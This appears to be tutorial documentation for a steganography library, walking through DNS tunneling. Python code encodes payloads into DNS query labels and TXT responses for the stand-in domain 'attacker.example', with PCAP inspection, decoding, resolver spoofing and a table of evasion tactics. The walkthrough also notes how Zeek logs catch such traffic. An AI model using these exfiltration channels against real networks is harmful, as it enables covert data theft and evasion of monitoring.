# DNS tunneling — end-to-end walkthrough

Encode `HELLO` via `DNS_LABEL`, watch the wire, decode the PCAP.
Then scale to a larger payload and switch to `DNS_TXT` for the
downlink direction.

## Setup

```python
from stegg import network_core
from stegg.network_core import StegoMethod, WireFormat, NetworkStegConfig

payload = b"HELLO"

config = NetworkStegConfig(
    method=StegoMethod.DNS_LABEL,
    wire_format=WireFormat.IP4_UDP_DNS,
    src_ip="10.0.0.5",
    dst_ip="8.8.8.8",
    sport=54321,
    dport=53,
    cover_domain="attacker.example",
)
```

## Encode DNS_LABEL

```python
pcap_bytes = network_core.encode(payload, config)
open("stego.pcap", "wb").write(pcap_bytes)
```

Behind the scenes:

1. Build the NETH header. Magic `NETH` + method_id 7 (DNS_LABEL) +
   wire_format_id + length 5 + crc32(payload). 12 bytes total.
2. `header_plus_payload` = 17 bytes.
3. Base32-encode → `JVEEG2LNJEGEKZLBNNTGE43UOJ2VS2Y=`.
   Lowercase + strip padding → `jveeg2lnjegekzlbnntge43uoj2vs2y`.
4. One 60-char chunk covers this. Emit a single DNS A query with
   QNAME `jveeg2lnjegekzlbnntge43uoj2vs2y.attacker.example`.

Wire result: one 82-byte UDP packet.

## Inspect the PCAP

Command line:

```
tshark -r stego.pcap -T fields -e dns.qry.name
```

Output:

```
jveeg2lnjegekzlbnntge43uoj2vs2y.attacker.example
```

The single query looks like a normal DNS lookup. Without a
detection rule for long labels or high-entropy subdomain names,
it would blend into normal DNS traffic.

## Decode

```python
recovered = network_core.decode(open("stego.pcap", "rb").read())
assert recovered["payload"] == payload
```

The decoder pipeline:

1. Parse the PCAP into a list of scapy Packet objects.
2. For each DNS packet, extract the left-most QNAME label.
3. Concatenate the labels in packet order.
4. Re-pad the base32 string and decode.
5. Read the NETH header from the first 12 bytes; verify magic + CRC.
6. Return a result dict with method, wire_format, payload, and
   crc_valid.

## Scale up: 4 KB payload

```python
payload_big = b"A" * 4096
pcap_bytes = network_core.encode(payload_big, config)
```

- Encoded size after NETH prepend: 4108 bytes.
- Base32 expansion: `ceil(4108 * 8 / 5)` = 6573 chars.
- Number of 60-char labels: 110 chunks.
- Result: 110 DNS query packets, each with its own QNAME and a
  distinct UDP source port (`sport + chunk_index`).

Wire bandwidth: about 90 bytes per packet × 110 packets ≈ 10 KB of
PCAP for a 4 KB payload. That is roughly 2.5× overhead from base32
+ NETH + DNS framing.

## Switch to DNS_TXT for the downlink

```python
config_txt = NetworkStegConfig(
    method=StegoMethod.DNS_TXT,
    wire_format=WireFormat.IP4_UDP_DNS,
    src_ip="8.8.8.8",         # posing as the resolver
    dst_ip="10.0.0.5",        # to the client
    sport=53,
    dport=54321,
    cover_domain="attacker.example",
)

pcap_bytes = network_core.encode(payload_big, config_txt)
```

Behind the scenes:

1. Same NETH header prepended.
2. Base64 encoding instead of base32.
3. Chunk size 255 bytes (DNS TXT single-string limit).
4. Emit DNS RESPONSE packets. Each carries one 255-byte TXT string.

For a 4 KB payload: `ceil(4108 * 4 / 3 / 255) = ~22` packets.
About 5× fewer packets than DNS_LABEL for the same payload — TXT is
denser but travels in one direction only (server → client).

## What would go wrong

| Change | Effect |
|--------|--------|
| Recursive resolver strips long labels | DNS_LABEL dies at the resolver; use DNS_TXT downlink |
| DoH at the resolver | Traffic gets encrypted client to resolver; the covert query still hits the covert authoritative, still works |
| Query rate limiting | Sustained tunnels hit RRL; low-and-slow is the operational mode |
| CNAME chase depth limit | If the cover domain uses CNAMEs, some resolvers cap the chain — a covert domain should point to A/TXT records directly |
| TCP fallback (DNS over TCP) | Longer messages (over 512 bytes) fall back to TCP; the packet count stays similar but the wire footprint changes |
| Local recursive with custom logging | Any Zeek `dns.log` captures every QNAME — detection is a log query, not a wire capture |

## Comparison to iodine and DNScat2

- **iodine** builds an IPv4 point-to-point tunnel over DNS.
  Bidirectional, high-throughput (up to hundreds of KB per second
  in ideal conditions).
- **DNScat2** (Ron Bowes) provides an interactive command-and-
  control channel over DNS with a session layer and per-session
  encryption.
- **ST3GG's DNS_LABEL / DNS_TXT** are single-payload encoders — no
  session state, no reliability, no sequence numbers beyond the UDP
  source port. Good for CTF demos and single-file smuggles; not
  operational-grade for a sustained C2 channel.

## Sources

- [[network-dns-label]] / [[network-dns-txt]]
- iodine documentation
- DNScat2 (Ron Bowes)
- [[st3gg-field-guide]]
